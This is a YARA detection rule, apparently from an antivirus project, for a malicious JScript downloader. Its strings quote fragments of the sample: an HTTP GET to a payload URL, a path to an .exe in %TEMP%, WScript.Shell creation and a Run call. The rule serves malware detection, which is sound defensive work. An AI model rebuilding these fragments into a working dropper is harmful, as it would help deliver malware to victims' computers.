rule sig_20160329_5680f6a62b6d7a97e44a0c6fe3e3d04e {
  meta:
    description = "datamaliciousorder - file 20160329_5680f6a62b6d7a97e44a0c6fe3e3d04e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9e4ae1133fc83576f80bf0c6e3a5a51ae3f506ca53f15d13e72f38a20194c583"

  strings:
    $s1  = "jA[I](\"GET\", \"http://zilton.com/o9qwp\", false);" fullword ascii
    $s2  = "function y() {return x0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Q3aWyGjPCCdW2WYX.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Ev](T() * 11); if (jA[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var x0 = function ED() {return WScript[c](\"WScript.Shell\");}(), qM = 11;" fullword ascii
    $s5  = "function a(v, J){pF = pF * 1; return v - J;};" fullword ascii
    $s6  = "function bZ(){return \"\" + hl;};" fullword ascii
    $s7  = "function UM() {return ((H == true) && (H == K0)) ? 1 : pF;};" fullword ascii
    $s8  = "function U(k){x0[\"Run\"](k, pF, pF);};" fullword ascii
    $s9  = "function g()" fullword ascii
    $s10 = "function T(){return 22;};" fullword ascii
    $s11 = "function K(vX) {var b = (1, 2, 3, 4, 5, vX); return b;};" fullword ascii
    $s12 = "var VQ = new this[\"Date\"]();" fullword ascii
    $s13 = " while (q){" fullword ascii
    $s14 = "return a(S0, Pr);" fullword ascii
    $s15 = "function x(){return c;};" fullword ascii
    $s16 = "var K0 = false;" fullword ascii
    $s17 = "K0 = true; " fullword ascii
    $s18 = "var ZA = false;" fullword ascii
    $s19 = "H = true; " fullword ascii
    $s20 = "var H = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}